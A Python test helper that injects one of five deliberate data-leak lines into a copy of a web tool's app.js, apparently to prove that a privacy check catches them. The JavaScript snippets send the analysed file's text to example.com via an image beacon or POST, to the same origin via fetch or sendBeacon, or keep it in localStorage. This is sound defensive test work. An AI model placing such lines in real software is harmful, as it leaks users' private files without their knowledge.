#!/usr/bin/env python3
"""Plant one data leak in a copy of the tool, for scripts/prove-privacy.sh.

    python3 scripts/plant_leak.py --list
    python3 scripts/plant_leak.py <copy-dir> <leak>

Each leak sends or keeps the person's file the moment it is analysed.
Never run this on the repository itself, only on a copy.
"""
import pathlib
import sys

BREAKS = {
 # P1 a same-origin request carrying data; P2 browser storage; P3 an image
 # beacon to another origin; P4 sendBeacon; P5 a POST to another origin.
 "P1": 'fetch("data/strings.json?d=" + encodeURIComponent(source.text.slice(0, 40)));',
 "P2": 'localStorage.setItem("last", source.text);',
 "P3": 'new Image().src = "https:" + "//example.com/p?d=" + source.text.length;',
 "P4": 'navigator.sendBeacon("data/x", source.text);',
 "P5": 'fetch("https:" + "//example.com/c", {method: "POST", body: source.text}).catch(() => {});',
}
if sys.argv[1] == "--list":
    print(" ".join(BREAKS))
    sys.exit(0)
if pathlib.Path(sys.argv[1]).resolve() == pathlib.Path(__file__).resolve().parents[1]:
    sys.exit("refusing to plant a leak in the repository itself")
p = pathlib.Path(sys.argv[1]) / "web" / "app.js"
s = p.read_text()
anchor = '  showMessage("");\n  view = result.ok;'
assert anchor in s
p.write_text(s.replace(anchor, '  showMessage("");\n  ' + BREAKS[sys.argv[2]] + '\n  view = result.ok;'))
print("planted", sys.argv[2], BREAKS[sys.argv[2]])
